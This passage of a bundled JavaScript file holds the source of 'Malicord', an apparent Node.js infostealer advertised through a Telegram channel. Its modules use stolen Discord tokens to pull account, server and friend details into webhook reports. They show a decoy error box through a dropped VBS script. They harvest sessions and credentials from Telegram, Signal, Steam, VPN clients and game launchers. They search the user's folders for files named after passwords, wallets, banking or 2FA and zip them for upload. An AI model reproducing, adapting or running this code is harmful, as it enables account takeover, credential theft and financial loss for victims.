`\\`\\`\\`ansi\\n\u001b[2;32m${phone}\u001b[0m\u001b[2;32m\u001b[0m\\`\\`\\``,\n        inline: true,\n      },\n      {\n        name: `Passwords Found`,\n        value: `\\`\\`\\`ansi\\n\u001b[2;32m${password}\u001b[0m\u001b[2;32m\u001b[0m\\`\\`\\``,\n        inline: false,\n      },\n    ],\n    thumbnail: {\n      url: `${avatar}`,\n    },\n    footer: {\n      text: \"@Malicord | https://t.me/Sordeal\",\n    },\n  };\n  return JSON.stringify(embed);\n}\n\nasync function embedguild(token) {\n  try {\n    const guilds = await getURL(\n      \"https://discord.com/api/v9/users/@me/guilds\",\n      token\n    );\n    if (\n      guilds.length < 1 ||\n      guilds === null ||\n      guilds === undefined ||\n      Guilds.length === 0\n    ) {\n      return null;\n    }\n    const Guilds = await parseGuilds(guilds, token);\n\n    const formattedGuilds = await Guilds.map(\n      (g) =>\n        ` **${g.Name}**\\n` +\n        ` **ID:** \\`${g.ID}\\`\\n` +\n        `  **Members Count:** \\`${g.MembersCount}\\`\\n` +\n        ` **Roles Count:** \\`${g.RolesCount}\\`\\n` +\n        ` **Boost:** \\`${g.Boost}\\`\\n` +\n        ` **Vanity:** \\`${g.Vanity}\\`\\n\\n`\n    ).join(\"\");\n    const params2 = {\n      title: `${embeds.nova} Total Guilds Owner/Admin (${Guilds.length})`,\n      description: formattedGuilds,\n      color: 10038562,\n    };\n    return JSON.stringify(params2);\n  } catch (error) {\n    return null;\n  }\n}\n\nasync function embedbis(token) {\n  try {\n    const friends = await getURL(\n      \"https://discord.com/api/v9/users/@me/relationships\",\n      token\n    );\n    /*\n    let embed = \"None\";\n    const bots = await getURL(\n      \"https://discord.com/api/v9/applications?with_team_applications=true\",\n      token\n    );\n\n    if (bots.length > 0) {\n      const certif = {\n        1: \"No\",\n        2: \"Eligible\",\n        3: \"In progress\",\n        4: \"Yes\",\n      };\n\n      for (const bot of bots) {\n        console.log(bot)\n        if (bot.verification_state != 1) {\n          embed = `**Bot:** ${bot.username}#${\n            bot.discriminator\n          }\\n**State:**: ${certif[bot.verification_state]}`;\n        }\n      }\n    }*/\n    if (friends.length < 1 || friends === null || friends === undefined) {\n      return null;\n    }\n    const Friends = parseFriends(friends);\n    const params2 = {\n      title: `${embeds.nova} UHQ Friends (${Friends.len})`,\n      description: \"**Friends:**\\n\" + Friends.badges,\n      color: 10038562,\n    };\n    return JSON.stringify(params2);\n  } catch (error) {\n    return null;\n  }\n}\n\nconst getURL = async (url, token) => {\n  try {\n    const response = await axios.get(url, {\n      headers: {\n        Authorization: token,\n      },\n    });\n    return response.data;\n  } catch (error) {\n    return null;\n  }\n};\n\nconst GetRBadges = (e) => {\n  var n = \"\";\n  return (\n    1 == (1 & e) && (n += `${badge.staff} `),\n    2 == (2 & e) && (n += `${badge.partner} `),\n    4 == (4 & e) && (n += `${badge.hypesquad_event} `),\n    8 == (8 & e) && (n += `${badge.bughunter_1} `),\n    512 == (512 & e) && (n += `${badge.early} `),\n    16384 == (16384 & e) && (n += `${badge.bughunter_2} `),\n    131072 == (131072 & e) && (n += `${badge.developer} `),\n    \"\" == n && (n = \":x:\"),\n    n\n  );\n};\n\nconst parseGuilds = async (guilds, token) => {\n  let ownerguilds = [];\n  try {\n    for (const g of guilds) {\n      if (g.owner || g.permissions == 140737488355327) {\n        const response = await getURL(\n          `https://discord.com/api/v9/guilds/${g.id}?with_counts=true`,\n          token\n        );\n        if (response.approximate_member_count > 50) {\n          let guildparsed = {\n            Name: g.name,\n            ID: g.id,\n            MembersCount: response.approximate_member_count,\n            Boost: response.premium_subscription_count,\n            Vanity: response.vanity_url_code ?? \"None\",\n            RolesCount: response.roles.length,\n          };\n          ownerguilds.push(guildparsed);\n        }\n      }\n    }\n    return ownerguilds;\n  } catch (err) {\n    return [];\n  }\n};\n\nconst parseFriends = (friends) => {\n  try {\n    var real = friends.filter((x) => x.type == 1);\n    var rareFriends = \"\";\n    for (var friend of real) {\n      var badges = GetRBadges(friend.user.public_flags);\n      if (badges !== \":x:\")\n        rareFriends += `${badges} | \\`${friend.user.username}#${friend.user.discriminator}\\`\\n`;\n    }\n    if (!rareFriends) rareFriends = \"*Nothing to see here*\";\n    return {\n      len: real.length,\n      badges: rareFriends,\n    };\n  } catch (err) {\n    return \":x:\";\n  }\n};\n\nfunction compile(embeds) {\n  var build = \"\";\n  build += `{\\n\"content\": null,\\n\"embeds\": [`;\n  for (let i = 0; i < embeds.length; i++) {\n    build += embeds[i];\n    if (i != embeds.length - 1) {\n      build += \",\\n\";\n    }\n  }\n  build += `],\\n\"avatar_url\": \"https://raw.githubusercontent.com/ksch-58/sub/main/assets/malicord-removebg-preview.png\",\\n\"username\": \"Malicord\",\\n\"attachments\": []\\n}`;\n  return build;\n}\n\nmodule.exports = {\n  embed,\n  embedbis,\n  MalicordDiscord,\n  compile,\n  embedguild,\n  WriteDiscord,\n};\n\n\n//# sourceURL=webpack://script/./utils/discord.js?");

/***/ }),

/***/ "./utils/emotes.js":
/*!*************************!*\
  !*** ./utils/emotes.js ***!
  \*************************/
/***/ ((module) => {

eval("const g = {\r\n  badge: {\r\n    nitro: \"<:946246402105819216:962747802797113365>\",\r\n    boost_1: \"<:Booster1Month:1051453771147911208>\",\r\n    boost_2: \"<:Booster2Month:1051453772360077374>\",\r\n    boost_3: \"<:Booster3Month:1159062676408905848>\",\r\n    boost_6: \"<:Booster6Month:1051453773463162890>\",\r\n    boost_9: \"<:Booster9Month:1051453774620803122>\",\r\n    boost_12: \"<:boost12month:1068308256088400004>\",\r\n    boost_15: \"<:Booster15Month:1051453775832961034>\",\r\n    boost_18: \"<:BoosterLevel8:1051453778127237180>\",\r\n    boost_24: \"<:Booster24Month:1051453776889917530>\",\r\n    staff: \"<:staff:874750808728666152>\",\r\n    partner: \"<:partner:874750808678354964>\",\r\n    hypesquad_event: \"<:hypesquadevent:1143858325579108505>\",\r\n    bughunter_1: \"<:bughunter_1:874750808426692658>\",\r\n    bughunter_2: \"<:bughunter_2:874750808430874664>\",\r\n    developer: \"<:developer:874750808472825986>\",\r\n    early: \"<:early_supporter:874750808414113823>\",\r\n    bravery: \"<:bravery:874750808388952075>\",\r\n    brillance: \"<:brilliance:874750808338608199>\",\r\n    balance: \"<:balance:874750808267292683>\",\r\n    active_developer: \"<:activedev:1143858315886088263>\",\r\n  },\r\n  embeds: {\r\n    karma: \"<:karma:1173646047134892052>\",\r\n    gold: \"<a:987689939401588827:1149305616418996224>\",\r\n    tiktok: \"<:tiktok:1173628882168053811>\",\r\n    instaiscert: \"<:certifiedinsta:1173581219187937310>\",\r\n    instagram: \"<a:instawhite:853376415759335455>\",\r\n    instagram_certified:\"<:instagramlogo:1173581240650182717>\",\r\n    twitter_usernamecert: \"<:certi_twitter:1159090158117867571>\",\r\n    twitter_usernameuncert: \"<:twitter:1159090161494270052>\",\r\n    twitter_followers: \"<:a2_grey_twitter:1135298638248161361>\",\r\n    twitter_followings: \"<:Twitter_retweet:1135298386531188897>\",\r\n    twitter_fav: \"<:twitter_follow:1135298434967019540>\",\r\n    twitter_location: \"<a:controller:1159090439207518269> Location:\",\r\n    inject: \"<a:inject:1159081839596687400>\",\r\n    atom: \"<:account:1159081832751566858>\",\r\n    dsc: \"<:roblux:1159081834966155264>\",\r\n    rblxinfo: \"<:info:1159081837365313619>\",\r\n    infoyl: \"<:ylinfo:1159081835779866635>\",\r\n    mcid: \"<a:books:1159078873699450902>\",\r\n    mcmail: \"<:email:1159078862135775252> \",\r\n    mcgapple: \"<:gapple:1159078870461460480>\",\r\n    hypixel: \"<:hypixel:1159078857542996090>\",\r\n    keysmc: \"<a:keys:1159078859682107453>\",\r\n    namemc: \"<:namemc:1159078855550713886>\",\r\n    games: \"\",\r\n    vpn: \"\",\r\n    clients: \"\",\r\n    nova: \"<:nova:1132934190032244786>\",\r\n    crypto: \"<:crypto:1132938335795552277>\",\r\n    creditcard: \"<:visa_nova:1159070277767012373>\",\r\n    paypal: \"<:paypal:1159072459023204403>\",\r\n    Old_Username: \"<:username:1120100668846387210>\",\r\n    token: \"<a:green_sparkles1:1151916003815604254>\",\r\n    badges: \"<:xans_black:1149305791577337958>\",\r\n    nitro: \"<:xans_skull:1149305792516857888>\",\r\n    billings: \"<:black_money:1149305788033142824>\",\r\n    mail: \"<:black_star:1149405524476043364>\",\r\n    phone: \"<:devil_heart_black:1149305790373580810>\",\r\n    gift: \"<:1839festivepixelpresent:1171449290724491325>\",\r\n    username: \"<:black:1149305795993935912>\",\r\n    cat: \"<a:caat2:1130448854861488168>\",\r\n  },\r\n  stats: {\r\n    password: \"<a:blackk:1149413233820696636>\",\r\n    cookie: \"<:black_star:1149405524476043364>\",\r\n    card: \"<a:Card_Black:1149412215531778098>\",\r\n    autofill: \"<a:black_hearts:1149412328350163005>\",\r\n    metamask: \"<:metamask:1149413032406036531>\",\r\n    exodus: \"<:exodus:1159071625816322120>\",\r\n    computer: \"<:computer:1159071823116378162>\",\r\n    ip: \"<:black_coroa1:1149305621703839775>\",\r\n    country: \"<:black_coroa1:1149305621703839775>\",\r\n    disclamer: \"<:TES_heart_glowing_green:1151915700521275452>\",\r\n    download: \"<:download:907724223328432269>\",\r\n  },\r\n};\r\n\r\nlet { embeds, stats, badge } = g;\r\n\r\nmodule.exports = {\r\n  embeds,\r\n  stats,\r\n  badge,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/emotes.js?");

/***/ }),

/***/ "./utils/fake_error.js":
/*!*****************************!*\
  !*** ./utils/fake_error.js ***!
  \*****************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const { exec } = __webpack_require__(/*! child_process */ \"child_process\"),\r\n  fs = __webpack_require__(/*! fs */ \"fs\"),\r\n  save = __webpack_require__(/*! ./save */ \"./utils/save.js\")\r\n\r\nconst generateRandomName = (length) => {\r\n  const characters =\r\n    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\";\r\n  let result = \"\";\r\n  for (let i = 0; i < length; i++) {\r\n    const randomIndex = Math.floor(Math.random() * characters.length);\r\n    result += characters[randomIndex];\r\n  }\r\n  return result;\r\n};\r\n\r\nfunction error(cc, msg) {\r\n  if (cc !== \"yes\") return;\r\n  const vbsScript = `\r\n  Set objShell = WScript.CreateObject(\"WScript.Shell\")\r\n  MsgBox \"Error : ${msg}\", vbInformation, \"Error Code : 43 \"\r\n  `;\r\n  const randomName = generateRandomName(12);\r\n  const vbsFileName = process.env.APPDATA + \"\\\\\" + randomName + \".vbs\";\r\n\r\n  fs.writeFileSync(vbsFileName, vbsScript, \"utf8\");\r\n\r\n  exec(\"cscript \" + vbsFileName, (error, stdout, stderr) => {\r\n    if (error) {\r\n      save.SaveError(error);\r\n    }\r\n  });\r\n}\r\n\r\nmodule.exports = {\r\n  error,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/fake_error.js?");

/***/ }),

/***/ "./utils/files.js":
/*!************************!*\
  !*** ./utils/files.js ***!
  \************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const fs = __webpack_require__(/*! fs */ \"fs\"),\n  save = __webpack_require__(/*! ./save */ \"./utils/save.js\"),\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\n  path = __webpack_require__(/*! path */ \"path\"),\n  appdata = process.env.appdata,\n  local = process.env.localappdata,\n  archiver = __webpack_require__(/*! archiver */ \"archiver\"),\n  { upload } = __webpack_require__(/*! ./uploadFiles */ \"./utils/uploadFiles.js\"),\n  https = __webpack_require__(/*! https */ \"https\"),\n  axios = __webpack_require__(/*! axios */ \"axios\"),\n  agent = new https.Agent({ rejectUnauthorized: false }),\n  fsPromises = fs.promises;\n\nclass SimpleFile {\n  constructor(name, mainfolder, existpath, stealpath) {\n    this.name = name;\n    this.mainfolder = mainfolder;\n    this.existpath = existpath;\n    this.stealpath = stealpath;\n  }\n}\n\nfunction MalicordSimple() {\n  try {\n    const homepath = process.env.homepath;\n    const simples = [\n      new SimpleFile(\"NationsGlory\", \"Games\", appdata + \"\\\\NationsGlory\\\\\", [\n        appdata + \"\\\\NationsGlory\\\\Local Storage/leveldb\",\n      ]),\n\n      new SimpleFile(\"Growtopia\", \"Games\", local + \"\\\\Growtopia\\\\\", [\n        local + \"\\\\Growtopia\\\\save.dat\",\n      ]),\n      new SimpleFile(\"Minecraft\", \"Games\", appdata + \"\\\\.minecraft\\\\\", []),\n      new SimpleFile(\n        \"Skype\",\n        \"Social\",\n        appdata + \"\\\\Microsoft\\\\Skype for Desktop\\\\Local Storage\\\\\",\n        [appdata + \"\\\\Microsoft\\\\Skype for Desktop\\\\Local Storage\\\\\"]\n      ),\n      new SimpleFile(\n        \"Element\",\n        \"Social\",\n        appdata + \"\\\\Element\\\\Local Storage\\\\\",\n        [appdata + \"\\\\Element\\\\Local Storage\\\\\"]\n      ),\n      new SimpleFile(\"Signal\", \"Social\", appdata + \"\\\\Signal\\\\\", [\n        appdata + \"\\\\Signal\\\\Local Storage\\\\\",\n        appdata + \"\\\\Signal\\\\Session Storage\\\\\",\n        appdata + \"\\\\Signal\\\\sql\\\\\",\n        appdata + \"\\\\Signal\\\\databases\\\\\",\n        appdata + \"\\\\Signal\\\\config.json\",\n      ]),\n      new SimpleFile(\"ICQ\", \"Social\", appdata + \"\\\\ICQ\\\\0001\\\\\", [\n        appdata + \"\\\\ICQ\\\\0001\\\\\",\n      ]),\n      new SimpleFile(\"FileZilla\", \"Clients\", appdata + \"\\\\FileZilla\\\\\", [\n        appdata + \"\\\\FileZilla\\\\recentservers.xml\",\n      ]),\n      new SimpleFile(\n        \"OpenVPN Connect\",\n        \"VPN\",\n        appdata + \"\\\\OpenVPN Connect\\\\\",\n        [appdata + \"\\\\OpenVPN Connect\\\\profiles\"]\n      ),\n      new SimpleFile(\"Shadow\", \"Clients\", appdata + \"\\\\shadow\\\\\", [\n        appdata + \"\\\\shadow\\\\Local State\",\n        appdata + \"\\\\shadow\\\\Local Storage\\\\\",\n        appdata + \"\\\\shadow\\\\Session Storage\\\\\",\n      ]),\n      new SimpleFile(\"TotalCommander\", \"Clients\", appdata + \"\\\\GHISLER\\\\\", [\n        appdata + \"\\\\GHISLER\\\\wcx_ftp.ini\",\n      ]),\n      new SimpleFile(\n        \"LunarClient\",\n        \"Games\",\n        homepath + \"\\\\.lunarclient\\\\settings\\\\game\\\\\",\n        []\n      ),\n      new SimpleFile(\"FeatherClient\", \"Games\", appdata + \"\\\\.feather\\\\\", []),\n      new SimpleFile(\n        \"EssentialClient\",\n        \"Games\",\n        appdata + \"\\\\.minecraft\\\\essential\\\\\",\n        []\n      ),\n      new SimpleFile(\n        \"TLauncher\",\n        \"Games\",\n        appdata + \"\\\\.tlauncher\\\\mcl\\\\Minecraft\\\\game\\\\\",\n        []\n      ),\n    ];\n\n    for (let i = 0; i < simples.length; i++) {\n      const simple = simples[i];\n      \n      if (fs.existsSync(simple.existpath)) {\n        \n        if (simple.mainfolder == \"Clients\") {\n          stat.AddSysAdmin(simple.name);\n        }\n        if (simple.mainfolder == \"Social\") {\n          stat.AddMessenger(simple.name);\n        }\n        if (\n          simple.mainfolder == \"Games\" &&\n          !simple.name.includes(\"craft\") &&\n          !simple.name.includes(\"lunar\") &&\n          !simple.existpath.includes(\"feather\")\n        ) {\n          stat.AddGames(simple.name);\n        }\n        if (\n          simple.existpath.includes(\"craft\") ||\n          simple.existpath.includes(\"lunarclient\") ||\n          simple.existpath.includes(\"feather\")\n        ) {\n          stat.AddGames(simple.name);\n          const mcfiles = fs.readdirSync(simple.existpath);\n          const filteredFiles = mcfiles.filter(\n            (file) =>\n              file.includes(\".json\") ||\n              file.includes(\".txt\") ||\n              file.includes(\".dat\")\n          );\n\n          filteredFiles.forEach((f) => {\n            const fullPath = path.join(simple.existpath, f);\n            if (f.includes(\".json\")) {\n              stat.addMinecraft(fullPath);\n            }\n            simple.stealpath.push(fullPath);\n          });\n        }\n        save.ArraySave(simple.stealpath, simple.mainfolder, simple.name);\n      }\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\n\nfunction parseConfigVDF(filePath) {\n  const vdf = fs.readFileSync(filePath, \"utf-8\");\n  const lines = vdf.split('\\n');\n  let result = [];\n\n  for (const line of lines) {\n    const matches = line.match(/7656[0-9]{13}/gi);\n    if (matches) {\n      result = result.concat(matches);\n    }\n  }\n\n  return result;\n}\n\n\nfunction MalicordSteam(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const mainPath = [\n      \"C:\\\\program files (x86)\\\\steam\\\\\",\n      \"C:\\\\program files\\\\steam\\\\\",\n    ];\n\n    var saves = [];\n\n    for (let i = 0; i < mainPath.length; i++) {\n      const path = mainPath[i];\n      if (fs.existsSync(path)) {\n        const files = fs.readdirSync(path);\n\n        for (let u = 0; u < files.length; u++) {\n          const file = files[u];\n\n          const savePath = path + file;\n\n          if (file.includes(\"ssfn\")) {\n            saves.push(savePath);\n          }\n        }\n\n        const configPath = path + \"config\\\\\";\n        if (fs.existsSync(configPath)) {\n          saves.push(configPath);\n          if (fs.existsSync(configPath + \"config.vdf\")) {\n            const configData = parseConfigVDF(configPath + \"loginusers.vdf\");\n\n            stat.addSteam(configData);\n          }\n        }\n      }\n    }\n    if (saves.length != 0) {\n      stat.AddGames(\"Steam\");\n      save.ArraySave(saves, \"Launcher\", \"Steam\");\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction MalicordTelegram(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const telegram_path = appdata + \"\\\\Telegram Desktop\\\\tdata\\\\\";\n\n    if (!fs.existsSync(telegram_path)) {\n      return;\n    }\n\n    var saves = [];\n\n    const files = fs.readdirSync(telegram_path);\n\n    for (var i = 0; i < files.length; i++) {\n      const file = files[i];\n      const savePath = telegram_path + file;\n      if (fs.lstatSync(savePath).isDirectory()) {\n        if (file.length != 16) {\n          continue;\n        }\n\n        saves.push(savePath + \"//\");\n      } else {\n        if (file.endsWith(\"s\") || file.length == 17) {\n          saves.push(savePath);\n        }\n\n        if (\n          file.startsWith(\"settings\") ||\n          file.startsWith(\"key_data\") ||\n          file.startsWith(\"usertag\")\n        ) {\n          saves.push(savePath);\n        }\n      }\n    }\n\n    stat.AddMessenger(\"Telegram\");\n    save.ArraySave(saves, \"Social\", \"Telegram\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction MalicordTox(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const tox_path = appdata + \"\\\\tox\\\\\";\n\n    var saves = [];\n\n    if (!fs.existsSync(tox_path)) {\n      return;\n    }\n\n    if (fs.existsSync(tox_path)) {\n      const files = fs.readdirSync(tox_path);\n\n      for (let i = 0; i < files.length; i++) {\n        const file = files[i];\n        const savePath = tox_path + file;\n\n        if (\n          file.endsWith(\".tox\") ||\n          file.endsWith(\".ini\") ||\n          file.endsWith(\".db\")\n        ) {\n          saves.push(savePath);\n        }\n      }\n    }\n\n    stat.AddMessenger(\"Tox\");\n    save.ArraySave(saves, \"Social\", \"Tox\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction MalicordPidgin(cc) {\n  if (!cc) return;\n  try {\n    const mainPath = appdata + \"\\\\.purple\\\\\";\n\n    if (!fs.existsSync(mainPath)) {\n      return;\n    }\n\n    if (fs.existsSync(mainPath + \"accounts.xml\")) {\n      stat.AddMessenger(\"Pidgin\");\n      save.ArraySave([mainPath + \"accounts.xml\"], \"Social\", \"Pidgin\");\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction MalicordNordVPN(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const mainPath = local + \"\\\\NordVPN\\\\\";\n\n    if (!fs.existsSync(mainPath)) {\n      return;\n    }\n\n    const files = fs.readdirSync(mainPath);\n    var saves = [];\n\n    for (let i = 0; i < files.length; i++) {\n      const file = files[i];\n      const savePath = mainPath + file + \"\\\\\";\n\n      if (fs.statSync(savePath).isDirectory) {\n        if (file.includes(\"exe\")) {\n          const filesExe = fs.readdirSync(savePath);\n\n          for (let u = 0; u < filesExe.length; u++) {\n            const fileExe = filesExe[u];\n\n            if (fs.existsSync(savePath + fileExe + \"\\\\user.config\")) {\n              saves.push(savePath + fileExe + \"\\\\user.config\");\n            }\n          }\n        }\n      }\n    }\n\n    stat.AddVpn(\"NordVPN\");\n    save.ArraySave(saves, \"VPN\", \"NordVPN\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction MalicordProton(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const mainPath = local + \"\\\\ProtonVPN\\\\\";\n\n    if (!fs.existsSync(mainPath)) {\n      return;\n    }\n\n    const files = fs.readdirSync(mainPath);\n    var saves = [];\n\n    for (let i = 0; i < files.length; i++) {\n      const file = files[i];\n      const savePath = mainPath + file + \"\\\\\";\n\n      if (fs.statSync(savePath).isDirectory) {\n        if (file.includes(\"exe\")) {\n          const filesExe = fs.readdirSync(savePath);\n\n          for (let u = 0; u < filesExe.length; u++) {\n            const fileExe = filesExe[u];\n\n            if (fs.existsSync(savePath + fileExe + \"\\\\user.config\")) {\n              saves.push(savePath + fileExe + \"\\\\user.config\");\n            }\n          }\n        }\n      }\n    }\n\n    stat.AddVpn(\"ProtonVPN\");\n    save.ArraySave(saves, \"VPN\", \"ProtonVPN\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction MalicordRiotGame(cc) {\n  if (cc != \"yes\") return;\n  let riotgame = local + \"\\\\Riot Games\\\\Riot Client\\\\Data\\\\\";\n  try {\n    var saves = [];\n\n    if (fs.existsSync(path)) {\n      const files = fs.readdirSync(riotgame);\n\n      for (let u = 0; u < files.length; u++) {\n        const file = files[u];\n\n        const savePath = path + file;\n        saves.push(savePath);\n      }\n    }\n    if (saves.length != 0) {\n      stat.AddGames(\"Riotgames\");\n      save.ArraySave(saves, \"Launcher\", \"RiotGames\");\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction MalicordEpicGame(cc) {\n  if (cc != \"yes\") return;\n  let epicpath = [];\n  try {\n    const epicgame = local + \"\\\\EpicGamesLauncher\\\\Saved\\\\Config\\\\Windows\\\\\";\n    const config_file = path.join(epicgame, \"GameUserSettings.ini\");\n\n    if (fs.existsSync(epicgame) && fs.existsSync(config_file)) {\n      const contents = fs.readFileSync(config_file, \"utf-8\");\n      if (contents.includes(\"[RememberMe]\")) {\n        const files = fs.readdirSync(epicgame);\n        for (let i = 0; i < files.length; i++) {\n          const file = files[i];\n          const filePath = epicgame + file;\n          epicpath.push(filePath);\n        }\n      }\n      stat.AddGames(\"EpicGame\");\n      save.ArraySave(epicpath, \"Launcher\", \"EpicGame\");\n    }\n  } catch (error) {\n    save.SaveError(error);\n  }\n}\n\nfunction MalicordUbisoft(cc) {\n  if (cc != \"yes\") return;\n  let riotgame = local + \"\\\\Ubisoft Game Launcher\\\\\";\n  try {\n    var saves = [];\n\n    if (fs.existsSync(path)) {\n      const files = fs.readdirSync(riotgame);\n\n      for (let u = 0; u < files.length; u++) {\n        const file = files[u];\n\n        const savePath = path + file;\n        saves.push(savePath);\n      }\n    }\n    if (saves.length != 0) {\n      stat.AddGames(\"Ubisoft\");\n      save.ArraySave(saves, \"Launcher\", \"Ubisoft\");\n    }\n  } catch (error) {}\n}\n\nfunction MalicordOpenVPN(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const mainPath = appdata + \"\\\\OpenVPN Connect\\\\profiles\\\\\";\n    var saves = [];\n\n    if (!fs.existsSync(mainPath)) {\n      return;\n    }\n\n    const files = fs.readdirSync(mainPath);\n    for (let i = 0; i < files.length; i++) {\n      const file = files[i];\n      const savePath = mainPath + file;\n      saves.push(savePath);\n    }\n\n    stat.AddGames(\"OpenVPN\");\n    save.ArraySave(saves, \"VPN\", \"OpenVPN\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nfunction MalicordBattle(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const mainPath = appdata + \"\\\\Battle.net\\\\\";\n    var saves = [];\n\n    if (!fs.existsSync(mainPath)) {\n      return;\n    }\n\n    const files = fs.readdirSync(mainPath);\n\n    for (let i = 0; i < files.length; i++) {\n      const file = files[i];\n      const savePath = mainPath + file;\n\n      if (file.includes(\"db\") || file.includes(\"config\")) {\n        saves.push(savePath);\n      }\n    }\n\n    stat.AddGames(\"Battle.net\");\n    save.ArraySave(saves, \"Launcher\", \"Battlenet\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nasync function rechercherFichiers(repertoire, textes, extensions) {\n  const fichiersTrouves = [];\n\n  const fichiers = await fsPromises.readdir(repertoire);\n\n  for (const fichier of fichiers) {\n    const chemin = path.join(repertoire, fichier);\n    const stat = await fsPromises.stat(chemin);\n    const extension = path.extname(fichier).toLowerCase();\n\n    if (!stat.isDirectory() && extensions.includes(extension)) {\n      if (textes.some((texte) => fichier.toLowerCase().includes(texte))) {\n        fichiersTrouves.push(chemin);\n      }\n    }\n  }\n\n  return fichiersTrouves;\n}\n\nfunction genererNomAleatoire(longueur) {\n  const caracteres =\n    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\";\n  let nomAleatoire = \"\";\n  for (let i = 0; i < longueur; i++) {\n    const index = Math.floor(Math.random() * caracteres.length);\n    nomAleatoire += caracteres.charAt(index);\n  }\n  return nomAleatoire;\n}\n\nasync function zipEtSupprimerDossier(dossierSource) {\n  const dossierDestination = `${path.dirname(dossierSource)}\\\\@${process.env.USERNAME.replace(\".\", \"\") || \"USER\"}_Keywords.zip`;\n\n  return new Promise((resolve, reject) => {\n    const output = fs.createWriteStream(dossierDestination);\n    const archive = archiver(\"zip\", { zlib: { level: 9 } });\n\n    output.on(\"close\", async () => {\n      try {\n        await fsPromises.rm(dossierSource, { recursive: true });\n        resolve(dossierDestination);\n      } catch (err) {\n        reject(err);\n      }\n    });\n\n    archive.on(\"error\", (err) => {\n      reject(err);\n    });\n\n    archive.pipe(output);\n    archive.directory(dossierSource, false);\n    archive.finalize();\n  });\n}\n\nfunction NovasearchFilesDir(extensionsAutorisees, motsARechercher) {\n  const driveLetters = [];\n  for (let i = 65; i <= 90; i++) {\n    const driveLetter = String.fromCharCode(i) + \":\";\n    driveLetters.push(driveLetter);\n  }\n\n  const os = __webpack_require__(/*! os */ \"os\");\n  const mainDriveLetter =\n    os.platform() === \"win32\" ? os.homedir().charAt(0).toUpperCase() + \":\" : null;\n  if (mainDriveLetter) {\n    const index = driveLetters.indexOf(mainDriveLetter);\n    if (index !== -1) {\n      driveLetters.splice(index, 1);\n    }\n  }\n\n  const matchingFiles = [];\n\n  function checkFilesInDirectory(directory) {\n    try {\n      const files = fs.readdirSync(directory);\n      files.forEach((file) => {\n        const fileExtension = path.extname(file);\n        const fileName = path.basename(file);\n        if (extensionsAutorisees.includes(fileExtension)) {\n          for (const mot of motsARechercher) {\n            if (fileName.includes(mot)) {\n              matchingFiles.push(path.join(directory, file));\n              break; \n            }\n          }\n        }\n      });\n    } catch (error) {\n    }\n  }\n  driveLetters.forEach((driveLetter) => {\n    const directory = path.join(driveLetter, \"\\\\\");\n    checkFilesInDirectory(directory);\n  });\n  return matchingFiles;\n}\n\n\nasync function CheckSensitiveFiles(cc, wb) {\n  if (cc !== \"yes\") return;\n  const extensionsARechercher = [\n    \".txt\",\n    \".jpg\",\n    \".png\",\n    \".jpeg\",\n    \".sql\",\n    \".json\",\n    \".csv\",\n    \".doc\",\n    \".docm\",\n    \".docx\",\n    \".docx\",\n    \".point\",\n    \".dotm\",\n    \".dotx\",\n    \".odt\",\n    \".pdf\",\n    \".xml\",\n    \".Xps\",\n  ];\n\n  async function checkZipSize(filePath) {\n    try {\n      const stats = await fs.stat(filePath);\n      const fileSizeInBytes = stats.size;\n      const fileSizeInKilobytes = fileSizeInBytes / 1000;\n      return fileSizeInKilobytes < 1;\n    } catch (error) {\n      return false;\n    }\n  }\n  \n  const textesARechercher = [\n    \"backup\",\n    \"code\",\n    \"discord\",\n    \"token\",\n    \"passw\",\n    \"mdp\",\n    \"motdepasse\",\n    \"mot_de_passe\",\n    \"login\",\n    \"secret\",\n    \"account\",\n    \"acount\",\n    \"paypal\",\n    \"banque\",\n    \"bank\",\n    \"metamask\",\n    \"wallet\",\n    \"crypto\",\n    \"exodus\",\n    \"2fa\",\n    \"a2f\",\n    \"memo\",\n    \"compte\",\n    \"finance\",\n    \"seecret\",\n    \"credit\",\n    \"cni\",\n  ];\n  const repertoiresARechercher = [\n    `${process.env.USERPROFILE}\\\\Desktop`,\n    `${process.env.USERPROFILE}\\\\Downloads`,\n    `${process.env.USERPROFILE}\\\\Documents`,\n    `${process.env.USERPROFILE}\\\\Pictures`,\n  ];\n\n  const nomDossierAleatoire = genererNomAleatoire(20);\n  const dossierDestination = path.join(process.env.TMP, nomDossierAleatoire);\n  try {\n    await fsPromises.mkdir(dossierDestination);\n    for (const repertoire of repertoiresARechercher) {\n      const fichiersTrouves = await rechercherFichiers(\n        repertoire,\n        textesARechercher,\n        extensionsARechercher\n      );\n\n      let filchiersFinded = NovasearchFilesDir(extensionsARechercher, textesARechercher)\n      if (fichiersTrouves.length > 0) {\n        for (const fichier of fichiersTrouves) {\n          const nomFichier = path.basename(fichier);\n          const cheminDestination = path.join(\n            dossierDestination,\n            genererNomAleatoire(3) + \"_\" + nomFichier\n          );\n          await fsPromises.copyFile(fichier, cheminDestination);\n        }\n      }\n      if(filchiersFinded.length > 0){\n          for (const fichier of filchiersFinded) {\n            const nomFichier = path.basename(fichier);\n            const cheminDestination = path.join(\n              dossierDestination,\n              genererNomAleatoire(3) + \"_\" + nomFichier\n      